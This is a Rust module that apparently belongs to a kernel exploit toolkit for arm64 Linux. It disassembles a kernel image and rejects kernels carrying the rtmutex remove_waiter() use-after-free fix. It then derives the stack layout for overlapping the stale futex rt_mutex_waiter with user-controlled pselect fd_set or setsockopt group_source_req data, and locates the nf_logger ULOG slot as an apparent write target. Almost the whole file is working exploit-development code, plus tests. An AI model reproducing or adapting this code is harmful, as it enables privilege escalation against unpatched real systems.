//! Disassembly-driven derivation: pselect/futex waiter layout and the
//! nf_logger slide slot. Direct ports of the Python analysis.

use std::collections::{BTreeMap, BTreeSet};

use regex::Regex;

use crate::btf::Btf;
use crate::disasm::{
    add_sp_immediates, cmp_immediates, disassemble_range, first_sp_frame, has_direct_call,
    is_mov_w0_wzr, is_mov_x1, materialized_address, validate_frame_live_at,
};
use crate::error::{ExtractError, Result};
use crate::kallsyms::unique_or_err;

pub const PSELECT_ROUTE_NFDS: u64 = 320;
pub const OBJDUMP_CAP: usize = 0x2000;

pub type RelSymbols = BTreeMap<String, BTreeSet<u64>>;

/// Rebase kallsyms onto _text and return a sorted list of all offsets.
pub fn relative_symbols(
    symbols: &BTreeMap<String, BTreeSet<u64>>,
    base: u64,
) -> (RelSymbols, Vec<u64>) {
    let mut relative: RelSymbols = BTreeMap::new();
    let mut all_offsets: BTreeSet<u64> = BTreeSet::new();
    for (name, values) in symbols {
        let offsets: BTreeSet<u64> = values
            .iter()
            .filter(|value| **value >= base)
            .map(|value| *value - base)
            .collect();
        if !offsets.is_empty() {
            relative.insert(name.clone(), offsets.clone());
            all_offsets.extend(offsets);
        }
    }
    let sorted: Vec<u64> = all_offsets.into_iter().collect();
    (relative, sorted)
}

pub fn unique_offset(symbols: &RelSymbols, name: &str) -> Result<u64> {
    unique_or_err(symbols, name)
}

pub fn unique_offset_optional(symbols: &RelSymbols, name: &str) -> Option<u64> {
    unique_offset(symbols, name).ok()
}

fn disassemble_symbol(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    name: &str,
    cap: usize,
) -> Result<Vec<String>> {
    let start = unique_offset(symbols, name)? as usize;
    let higher = sorted_offsets.iter().find(|off| **off as usize > start);
    let stop = (start + cap).min(higher.map_or(start + cap, |off| *off as usize));
    disassemble_range(kernel, start, stop)
}

/// reject kernels that include the rtmutex
/// remove_waiter() fix before offset extraction.
pub fn ensure_rtmutex_43499_unpatched(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
) -> Result<u64> {
    let start = unique_offset_optional(symbols, "remove_waiter")
        .ok_or_else(|| ExtractError::new("cannot check: remove_waiter is not in kallsyms"))?;
    let cap = OBJDUMP_CAP as u64;
    let stop = (start + cap).min(
        sorted_offsets
            .iter()
            .find(|off| **off > start)
            .map_or(start + cap, |off| *off),
    );
    let dis = disassemble_range(kernel, start as usize, stop as usize)?;
    if remove_waiter_uses_current(&dis) {
        return Ok(start);
    }
    Err(ExtractError::already_fixed(format!(
        "remove_waiter()@{start:#x} never reads current (no mrs sp_el0); \
         rtmutex UAF fix is present"
    )))
}

/// True when `remove_waiter()` still operates on `current` (vulnerable):
/// the fixed variant no longer contains `mrs xN, sp_el0`.
pub fn remove_waiter_uses_current(dis: &[String]) -> bool {
    let mrs_current = Regex::new(r"(?i)\bmrs\s+x\d+,\s*s3_0_c4_c1_0\b").unwrap();
    dis.iter().any(|line| mrs_current.is_match(line))
}

#[cfg(test)]
mod tests {
    use super::remove_waiter_uses_current;
    #[test]
    fn patched_remove_waiter_never_reads_current() {
        let dis = vec![
            "0106f91c: ldr x20, [x23, #0x50]".to_string(),
            "0106f964: str xzr, [x20, #0x938]".to_string(),
            "0106fae8: mov x5, x20".to_string(),
        ];
        assert!(!remove_waiter_uses_current(&dis));
    }

    #[test]
    fn vulnerable_remove_waiter_reads_current() {
        let dis = vec![
            "01068de0: mrs x20, s3_0_c4_c1_0".to_string(),
            "01068e2c: mov x0, x21".to_string(),
            "01068e30: str xzr, [x20, #0x938]".to_string(),
        ];
        assert!(remove_waiter_uses_current(&dis));
    }
}

pub struct PselectLayout {
    pub shift: u64,
    pub waiter_local: u64,
    pub pselect_word0: i64,
    pub futex_waiter: i64,
    pub pselect_buffer: u64,
    /// Signed distance from the fd_set word0 to the futex waiter: positive
    /// qword = waiter inside the copied window, negative = copy stops short.
    pub waiter_off: i64,
    pub chain: String,
    pub futex_chain: String,
    pub frames: BTreeMap<String, u64>,
}

pub fn derive_pselect_layout(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: &Btf,
    route_nfds: u64,
) -> Result<PselectLayout> {
    let futex = derive_futex_waiter(kernel, symbols, sorted_offsets, btf)?;
    let mut names: Vec<(&str, &str)> = vec![
        ("pselect_wrapper", "__arm64_sys_pselect6"),
        ("pselect_core", "core_sys_select"),
    ];
    if unique_offset_optional(symbols, "do_pselect").is_some() {
        names.push(("pselect_dispatch", "do_pselect"));
    }

    let mut dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
    for (key, name) in &names {
        dis.insert(
            key,
            disassemble_symbol(kernel, symbols, sorted_offsets, name, OBJDUMP_CAP)?,
        );
    }

    let mut pselect_chain = vec!["pselect_wrapper"];
    let pselect_core_addr = unique_offset(symbols, "core_sys_select")?;
    if has_direct_call(&dis["pselect_wrapper"], pselect_core_addr) {
        // no dispatch frame in between
    } else if names.iter().any(|(k, _)| *k == "pselect_dispatch") {
        let dispatch_addr = unique_offset(symbols, "do_pselect")?;
        if !has_direct_call(&dis["pselect_wrapper"], dispatch_addr) {
            return Err(ExtractError::new(
                "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
            ));
        }
        if !has_direct_call(&dis["pselect_dispatch"], pselect_core_addr) {
            return Err(ExtractError::new(
                "do_pselect does not directly call core_sys_select",
            ));
        }
        pselect_chain.push("pselect_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
        ));
    }
    pselect_chain.push("pselect_core");

    for (caller, callee) in pselect_chain.iter().zip(pselect_chain.iter().skip(1)) {
        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }
    let mut frames: BTreeMap<String, u64> = futex.frames.clone();
    for (key, text) in &dis {
        let full_name = names.iter().find(|(k, _)| k == key).unwrap().1;
        frames.insert(format!("frame_{key}"), first_sp_frame(text, full_name)?);
    }

    let add_sp = add_sp_immediates(&dis["pselect_core"]);
    let mut buffer_candidates: BTreeSet<u64> = BTreeSet::new();
    for (reg, imm) in &add_sp {
        let peers: Vec<&str> = add_sp
            .iter()
            .filter(|(peer, peer_imm)| peer_imm == imm && peer != reg)
            .map(|(peer, _)| peer.as_str())
            .collect();
        let any_cmp = peers.iter().any(|peer| {
            let re = Regex::new(&format!(r"(?i)\bcmp\s+{reg},\s*{peer}\b")).unwrap();
            let re2 = Regex::new(&format!(r"(?i)\bcmp\s+{peer},\s*{reg}\b")).unwrap();
            dis["pselect_core"]
                .iter()
                .any(|line| re.is_match(line) || re2.is_match(line))
        });
        if any_cmp {
            buffer_candidates.insert(*imm);
        }
    }
    if buffer_candidates.len() != 1 {
        let hex: Vec<String> = buffer_candidates
            .iter()
            .map(|v| format!("{v:#x}"))
            .collect();
        return Err(ExtractError::new(format!(
            "core_sys_select fd_set buffer candidates not unique: {hex:?}"
        )));
    }
    let pselect_buffer = *buffer_candidates.iter().next().unwrap();
    let buffer_regs: BTreeSet<String> = add_sp
        .iter()
        .filter(|(_, imm)| *imm == pselect_buffer)
        .map(|(reg, _)| reg.clone())
        .collect();
    if buffer_regs.is_empty() {
        return Err(ExtractError::new(
            "core_sys_select stack buffer has no output register",
        ));
    }
    let buffer_regs: Vec<String> = buffer_regs.into_iter().collect();
    for buffer_reg in &buffer_regs {
        let anchor = Regex::new(&format!(
            r"(?i)\badd\s+{buffer_reg},\s*sp,\s*#0x{pselect_buffer:x}\b"
        ))
        .unwrap();
        validate_frame_live_at(
            &dis["pselect_core"],
            &anchor,
            &format!("core_sys_select/{buffer_reg}"),
        )?;
    }

    let fds_bytes = ((route_nfds + 63) / 64) * 8;
    let thresholds = cmp_immediates(&dis["pselect_core"]);
    if !thresholds
        .iter()
        .any(|threshold| fds_bytes < *threshold && *threshold <= fds_bytes + 8)
    {
        return Err(ExtractError::new(format!(
            "core_sys_select threshold does not prove route_nfds={route_nfds} \
             uses the stack fd_set path"
        )));
    }

    let frame_sum: u64 = pselect_chain
        .iter()
        .map(|key| frames[&format!("frame_{key}")])
        .sum();
    let pselect_word0 = -(frame_sum as i64) + pselect_buffer as i64;
    let futex_waiter = futex.depth;
    let delta = futex_waiter - pselect_word0;
    if delta % 8 != 0 {
        return Err(ExtractError::new(format!(
            "pselect/futex overlap is not qword-aligned: {delta}"
        )));
    }
    let chain = pselect_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    if delta < 0 {
        // the fd_set copy stops short of the waiter: pselect cannot write.
        // stamp the negative distance so the caller can still derive every
        // other route before deciding eligibility
        eprintln!(
            "info: pselect fd_set copy stops {delta} bytes short of the waiter; \
             stamping the route ineligible"
        );
        return Ok(PselectLayout {
            shift: 0,
            waiter_local: futex.local,
            pselect_word0,
            futex_waiter,
            pselect_buffer,
            waiter_off: delta,
            chain,
            futex_chain: futex.chain,
            frames,
        });
    }
    let shift = (delta / 8) as u64;
    if shift > 3 {
        return Err(ExtractError::infeasible(format!(
            "futex waiter starts {shift} qwords above the fd_set buffer; \
             task/lock would land outside the user-controlled words 0..14 \
             (max feasible shift is 3)"
        )));
    }
    if shift == 3 {
        eprintln!(
            "warning: waiter fits at the last usable word (shift=3); \
             wake_state falls outside the copied fd_set and relies on the \
             kernel zero-initialising it"
        );
    }
    let chain = pselect_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    Ok(PselectLayout {
        shift,
        waiter_local: futex.local,
        pselect_word0,
        futex_waiter,
        pselect_buffer,
        waiter_off: delta,
        chain,
        futex_chain: futex.chain,
        frames,
    })
}

pub struct FutexWaiter {
    pub local: u64,
    /// Byte depth of the waiter below the syscall-entry sp (negative).
    pub depth: i64,
    pub chain: String,
    pub frames: BTreeMap<String, u64>,
}

/// Depth of futex_wait_requeue_pi's rt_mutex_waiter local below the
/// syscall-entry sp. Both route geometries measure against it.
pub fn derive_futex_waiter(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: &Btf,
) -> Result<FutexWaiter> {
    let names: Vec<(&str, &str)> = vec![
        ("futex_wrapper", "__arm64_sys_futex"),
        ("futex_dispatch", "do_futex"),
        ("futex_wait", "futex_wait_requeue_pi"),
    ];
    let mut dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
    for (key, name) in &names {
        dis.insert(
            key,
            disassemble_symbol(kernel, symbols, sorted_offsets, name, OBJDUMP_CAP)?,
        );
    }

    let mut futex_chain = vec!["futex_wrapper"];
    let futex_wait_addr = unique_offset(symbols, "futex_wait_requeue_pi")?;
    if has_direct_call(&dis["futex_wrapper"], futex_wait_addr) {
        // no dispatch frame in between
    } else if has_direct_call(&dis["futex_wrapper"], unique_offset(symbols, "do_futex")?) {
        if !has_direct_call(&dis["futex_dispatch"], futex_wait_addr) {
            return Err(ExtractError::new(
                "do_futex does not directly call futex_wait_requeue_pi",
            ));
        }
        futex_chain.push("futex_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi",
        ));
    }
    futex_chain.push("futex_wait");

    for (caller, callee) in futex_chain.iter().zip(futex_chain.iter().skip(1)) {
        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }

    let mut frames: BTreeMap<String, u64> = BTreeMap::new();
    for (key, text) in &dis {
        let full_name = names.iter().find(|(k, _)| k == key).unwrap().1;
        frames.insert(format!("frame_{key}"), first_sp_frame(text, full_name)?);
    }

    // 6.1 names these tree_entry/pi_tree_entry, 5.15 and 6.6 tree/pi_tree.
    // Both spellings land on the same struct offsets.
    let pi_tree = btf
        .field("rt_mutex_waiter", "pi_tree")
        .or_else(|| btf.field("rt_mutex_waiter", "pi_tree_entry"));
    let wake_state = btf.field("rt_mutex_waiter", "wake_state");
    if pi_tree.is_none() || wake_state.is_none() {
        return Err(ExtractError::new(
            "BTF rt_mutex_waiter.pi_tree/wake_state missing",
        ));
    }
    let pi_tree = pi_tree.unwrap() as u64;
    let wake_state = wake_state.unwrap() as u64;

    let mut waiter_candidates: Vec<(String, u64)> = Vec::new();
    for (reg, imm) in add_sp_immediates(&dis["futex_wait"]) {
        if pi_tree != 0 {
            let re =
                Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree:x}\b")).unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        } else {
            let re =
                Regex::new(&format!(r"(?i)\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]")).unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        }
    }
    // Several registers can materialize the same sp local, so dedupe by offset.
    let mut seen = BTreeSet::new();
    waiter_candidates.retain(|(_, imm)| seen.insert(*imm));
    if waiter_candidates.len() != 1 {
        // Other locals take a +pi_tree sized add too. rt_mutex_init_waiter
        // leaves the waiter's own base in __rb_parent_color and stores a
        // constant wake_state, so keep only the candidate taking both.
        let lines = &dis["futex_wait"];
        waiter_candidates.retain(|(reg, imm)| {
            let self_store = lines.iter().any(|line| {
                Regex::new(&format!(r"(?i)\bstr\s+{reg},\s*\[sp,\s*#0x{imm:x}\]"))
                    .unwrap()
                    .is_match(line)
            });
            let wake_store = wake_state == 0
                || lines.iter().any(|line| {
                    Regex::new(&format!(
                        r"(?i)\bstr\s+w\d+,\s*\[sp,\s*#0x{:x}\]",
                        imm + wake_state
                    ))
                    .unwrap()
                    .is_match(line)
                });
            if !(self_store && wake_store) {
                eprintln!(
                    "info: dropping futex waiter candidate {reg}/sp+0x{imm:x} \
                     (no rt_mutex_init_waiter self or wake_state store)"
                );
            }
            self_store && wake_store
        });
    }
    if waiter_candidates.len() != 1 {
        return Err(ExtractError::new(format!(
            "futex waiter stack local not unique: {waiter_candidates:?}"
        )));
    }
    let (waiter_reg, waiter_local) = &waiter_candidates[0];
    let anchor = Regex::new(&format!(
        r"(?i)\badd\s+{waiter_reg},\s*sp,\s*#0x{waiter_local:x}\b"
    ))
    .unwrap();
    validate_frame_live_at(&dis["futex_wait"], &anchor, "futex_wait")?;

    let mut required_fields = vec![*waiter_local];
    if wake_state != 0 {
        required_fields.push(waiter_local + wake_state);
    }
    for required in required_fields {
        let re = Regex::new(&format!(r"(?i)\[sp,\s*#0x{required:x}\]")).unwrap();
        if !dis["futex_wait"].iter().any(|line| re.is_match(line)) {
            return Err(ExtractError::new(format!(
                "futex waiter candidate 0x{waiter_local:x} not cross-validated \
                 by a real field store at 0x{required:x}"
            )));
        }
    }

    let futex_sum: u64 = futex_chain
        .iter()
        .map(|key| frames[&format!("frame_{key}")])
        .sum();
    Ok(FutexWaiter {
        local: *waiter_local,
        depth: -(futex_sum as i64) + *waiter_local as i64,
        chain: futex_chain
            .iter()
            .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
            .collect::<Vec<_>>()
            .join("->"),
        frames,
    })
}

pub struct McastLayout {
    /// Offset of the stale waiter inside the copied option buffer.
    pub waiter_off: i64,
    pub buffer_size: u64,
    pub task_offset: u64,
    pub lock_offset: u64,
    /// Byte depths below the syscall-entry sp.
    pub buffer_depth: i64,
    pub waiter_depth: i64,
    pub buffer_local: u64,
    pub chain: String,
    pub frames: BTreeMap<String, u64>,
}

/// Disassemble the setsockopt path to the handler that copies struct
/// group_source_req onto its stack, then close that window against the waiter.
pub fn derive_mcast_layout(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: &Btf,
) -> Result<McastLayout> {
    // 5.15 enters ip_setsockopt through two indirect hops,
    // sock->ops->setsockopt and sk->sk_prot->setsockopt. Each hop is a real
    // stack frame between the syscall entry and the option copy, so the
    // chain names both callees.
    let names: Vec<(&str, &str)> = vec![
        ("setsockopt_wrapper", "__arm64_sys_setsockopt"),
        ("setsockopt_syscall", "__sys_setsockopt"),
        ("setsockopt_ops", "sock_common_setsockopt"),
        ("setsockopt_proto", "udp_setsockopt"),
        ("setsockopt_handler", "ip_setsockopt"),
    ];
    let buffer_size = btf
        .named_struct("group_source_req")
        .map(|item| item.size_or_type as u64)
        .ok_or_else(|| ExtractError::new("BTF group_source_req missing"))?;
    let task_offset = btf
        .field("rt_mutex_waiter", "task")
        .ok_or_else(|| ExtractError::new("BTF rt_mutex_waiter.task missing"))?
        as u64;
    let lock_offset = btf
        .field("rt_mutex_waiter", "lock")
        .ok_or_else(|| ExtractError::new("BTF rt_mutex_waiter.lock missing"))?
        as u64;

    let mut dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
    for (key, name) in &names {
        dis.insert(
            key,
            disassemble_symbol(kernel, symbols, sorted_offsets, name, OBJDUMP_CAP)?,
        );
    }
    if !has_direct_call(
        &dis["setsockopt_wrapper"],
        unique_offset(symbols, "__sys_setsockopt")?,
    ) {
        return Err(ExtractError::new(
            "__arm64_sys_setsockopt does not directly call __sys_setsockopt",
        ));
    }
    if !has_direct_call(
        &dis["setsockopt_proto"],
        unique_offset(symbols, "ip_setsockopt")?,
    ) {
        return Err(ExtractError::new(
            "udp_setsockopt does not directly call ip_setsockopt",
        ));
    }
    let buffer_local = copy_in_destination(&dis["setsockopt_handler"], buffer_size)?;

    let mut frames: BTreeMap<String, u64> = BTreeMap::new();
    let mut frame_sum = 0u64;
    for (key, text) in &dis {
        let full_name = names.iter().find(|(k, _)| k == key).unwrap().1;
        let frame = first_sp_frame(text, full_name)?;
        frames.insert(format!("frame_{key}"), frame);
        frame_sum += frame;
    }
    let buffer_depth = -(frame_sum as i64) + buffer_local as i64;
    let waiter_depth = derive_futex_waiter(kernel, symbols, sorted_offsets, btf)?.depth;
    let waiter_off = waiter_depth - buffer_depth;
    if waiter_off < 0 || waiter_off % 8 != 0 {
        return Err(ExtractError::new(format!(
            "mcast option buffer at sp+0x{buffer_local:x} (svc{buffer_depth}) starts \
             {waiter_off} bytes from the stale waiter at svc{waiter_depth}, so the \
             buffer misses it or does not land on a qword boundary"
        )));
    }
    if waiter_off as u64 + lock_offset + 8 > buffer_size {
        return Err(ExtractError::new(format!(
            "mcast waiter at 0x{waiter_off:x} leaves task/lock outside the \
             0x{buffer_size:x} option buffer"
        )));
    }
    Ok(McastLayout {
        waiter_off,
        buffer_size,
        task_offset,
        lock_offset,
        buffer_depth,
        waiter_depth,
        buffer_local,
        chain: format!(
            "{}->copy",
            names
                .iter()
                .map(|(_, name)| *name)
                .collect::<Vec<_>>()
                .join("->")
        ),
        frames,
    })
}

/// Stack local receiving the `size`-byte copy-in inside `handler`: an
/// `add x0, sp, #imm` whose following window loads x1 with the source and w2
/// with the length before a call.
fn copy_in_destination(handler: &[String], size: u64) -> Result<u64> {
    let add_re = Regex::new(r"(?i)\badd\s+x0,\s*sp,\s*#0x([0-9a-f]+)\b").unwrap();
    let src_re = Regex::new(r"(?i)\bmov\s+x1,\s*x\d+\b").unwrap();
    let size_re = Regex::new(&format!(r"(?i)\bmov\s+w2,\s*#0x{size:x}\b")).unwrap();
    let call_re = Regex::new(r"(?i)\bbl\s+0x[0-9a-f]+\b").unwrap();
    let mut found: BTreeSet<u64> = BTreeSet::new();
    for (index, line) in handler.iter().enumerate() {
        let Some(caps) = add_re.captures(line) else {
            continue;
        };
        let Ok(imm) = u64::from_str_radix(&caps[1], 16) else {
            continue;
        };
        let window = &handler[index..(index + 8).min(handler.len())];
        let source = window.iter().position(|line| src_re.is_match(line));
        let length = window.iter().position(|line| size_re.is_match(line));
        let call = window.iter().position(|line| call_re.is_match(line));
        if let (Some(source), Some(length), Some(call)) = (source, length, call) {
            if source < length && length <= call {
                found.insert(imm);
            }
        }
    }
    if found.len() != 1 {
        let hex: Vec<String> = found.iter().map(|imm| format!("{imm:#x}")).collect();
        return Err(ExtractError::new(format!(
            "option-buffer copy sites not unique for a 0x{size:x}-byte copy: {hex:?}"
        )));
    }
    Ok(*found.iter().next().unwrap())
}

fn u32_at(data: &[u8], off: u64) -> Result<u32> {
    let off = off as usize;
    if off + 4 > data.len() {
        return Err(ExtractError::new(format!(
            "u32 read out of range: 0x{off:x}"
        )));
    }
    Ok(u32::from_le_bytes(data[off..off + 4].try_into().unwrap()))
}

pub struct NfLoggerInfo {
    pub loggers: u64,
    pub nfulnl_logger: u64,
    pub loggers_0_1: u64,
    pub nf_log_type_ulog: i64,
}

/// Derive loggers[0][NF_LOG_TYPE_ULOG] by disassembling nf_log_register /
/// nfnetlink_log_init and closing the slot index against BTF.
pub fn derive_nf_logger_registration(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: &Btf,
) -> Result<NfLoggerInfo> {
    let register_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nf_log_register", 0x800)?;
    let init_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nfnetlink_log_init", 0x800)?;
    let logger = unique_offset(symbols, "nfulnl_logger")?;
    let loggers = unique_offset(symbols, "loggers")?;
    let type_off = btf
        .field("nf_logger", "type")
        .ok_or_else(|| ExtractError::new("BTF nf_logger.type missing"))?;
    if btf.direct_field_size("nf_logger", "type") != Some(4) {
        return Err(ExtractError::new("BTF nf_logger.type is not a 4-byte enum"));
    }
    let logger_type = u32_at(kernel, logger + type_off as u64)?;
    let ulog_value = btf
        .enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_ULOG missing"))?;
    let max_value = btf
        .enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_MAX missing"))?;
    let nfproto_unspec = btf
        .unique_enum_member_value("NFPROTO_UNSPEC")
        .ok_or_else(|| ExtractError::new("BTF NFPROTO_UNSPEC missing"))?;
    if logger_type as i64 != ulog_value || !(0 <= ulog_value && ulog_value < max_value) {
        return Err(ExtractError::new(format!(
            "nfulnl_logger.type does not close with BTF NF_LOG_TYPE_ULOG: \
             data={logger_type}, ulog={ulog_value}, max={max_value}"
        )));
    }

    let logger_aliases: BTreeSet<String> = register_text
        .iter()
        .filter_map(|line| is_mov_x1(line))
        .collect();
    if logger_aliases.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register logger alias not unique: {logger_aliases:?}"
        )));
    }
    let logger_reg = logger_aliases.iter().next().unwrap().clone();
    let type_load_re = Regex::new(&format!(
        r"(?i)\bldr\s+w(\d+),\s*\[{logger_reg},\s*#0x{type_off:x}\]"
    ))
    .unwrap();
    let mut type_loads: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in type_load_re.captures_iter(line) {
            type_loads.insert(caps[1].to_string());
        }
    }
    if type_loads.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register type load not unique: {type_loads:?}"
        )));
    }
    let type_reg = type_loads.iter().next().unwrap().clone();
    let adrp_re = Regex::new(r"(?i)\badrp\s+(x\d+),").unwrap();
    let mut base_regs: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in adrp_re.captures_iter(line) {
            let reg = caps[1].to_ascii_lowercase();
            if materialized_address(&register_text, &reg, loggers) {
                base_regs.insert(reg);
            }
        }
    }
    let mut indexed: Vec<(String, String)> = Vec::new();
    for base_reg in &base_regs {
        let lsl4_re = Regex::new(&format!(
            r"(?i)\badd\s+(x\d+),\s*{base_reg},\s*(x\d+),\s*lsl\s*#4"
        ))
        .unwrap();
        for line in &register_text {
            for caps in lsl4_re.captures_iter(line) {
                let destination = caps[1].to_ascii_lowercase();
                let pf_reg = caps[2].to_ascii_lowercase();
                let lsl3_re = Regex::new(&format!(
                    r"(?i)\badd\s+{destination},\s*{destination},\s*x{type_reg},\s*lsl\s*#3"
                ))
                .unwrap();
                if register_text.iter().any(|l| lsl3_re.is_match(l)) {
                    indexed.push((destination, pf_reg));
                }
            }
        }
    }
    let mut deduped: Vec<(String, String)> = Vec::new();
    for entry in indexed {
        if !deduped.contains(&entry) {
            deduped.push(entry);
        }
    }
    if deduped.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register loggers[pf][type] dataflow not unique: {deduped:?}"
        )));
    }
    let (slot_reg, _) = &deduped[0];
    let stlr_re = Regex::new(&format!(r"(?i)\bstlr\s+{logger_reg},\s*\[{slot_reg}\]")).unwrap();
    if !register_text.iter().any(|line| stlr_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register does not store the logger to the slot",
        ));
    }
    let bound_re = Regex::new(&format!(r"(?i)\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b")).unwrap();
    if !register_text.iter().any(|line| bound_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register type bound not closed with NF_LOG_TYPE_MAX",
        ));
    }

    let target = unique_offset(symbols, "nf_log_register")?;
    let call_re = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
    let calls: Vec<usize> = init_text
        .iter()
        .enumerate()
        .filter(|(_, line)| call_re.is_match(line))
        .map(|(index, _)| index)
        .collect();
    if calls.len() != 1 {
        return Err(ExtractError::new(format!(
            "nfnetlink_log_init -> nf_log_register calls: {}",
            calls.len()
        )));
    }
    let start = calls[0].saturating_sub(6);
    let call_window: Vec<String> = init_text[start..calls[0]].to_vec();
    if nfproto_unspec != 0 || !call_window.iter().any(|line| is_mov_w0_wzr(line)) {
        return Err(ExtractError::new(
            "nfnetlink_log_init does not register with NFPROTO_UNSPEC(0)",
        ));
    }
    if !materialized_address(&init_text, "x1", logger) {
        return Err(ExtractError::new(
            "nfnetlink_log_init x1 does not materialize nfulnl_logger",
        ));
    }
    let slot = loggers + ulog_value as u64 * 8;
    Ok(NfLoggerInfo {
        loggers,
        nfulnl_logger: logger,
        loggers_0_1: slot,
        nf_log_type_ulog: ulog_value,
    })
}

/// The measured-eligibility predicates, shared by src/core/util.c and the
/// app gate.
pub mod fit {
    /// The option buffer must cover the waiter's task, lock and length words.
    pub fn mcast(buffer_size: u64, waiter_off: i64, lock_offset: u64) -> bool {
        waiter_off > 0
            && buffer_size > 0
            && (waiter_off as u64) + lock_offset + 8 <= buffer_size
    }

    /// The extractor stamps a negative distance when its fd_set copy stops
    /// short of the waiter, which leaves no pselect transport.
    pub const fn pselect(waiter_off: i64) -> bool {
        waiter_off >= 0
    }
}

#[cfg(test)]
mod fit_tests {
    use super::fit;

    #[test]
    fn mcast_fit_rejects_a_window_short_of_lock_plus_len() {
        assert!(fit::mcast(0x108, 0x60, 0x38));
        assert!(fit::mcast(0xA0, 0x60, 0x38));
        assert!(!fit::mcast(0x98, 0x60, 0x38));
        assert!(!fit::mcast(0x108, 0xD0, 0x38));
        assert!(!fit::mcast(0x108, 0, 0x38));
        assert!(!fit::mcast(0, 0x60, 0x38));
    }

    #[test]
    fn pselect_fit_follows_the_stamped_distance() {
        assert!(fit::pselect(0));
        assert!(fit::pselect(0x78));
        assert!(!fit::pselect(-0x2F8));
    }
}
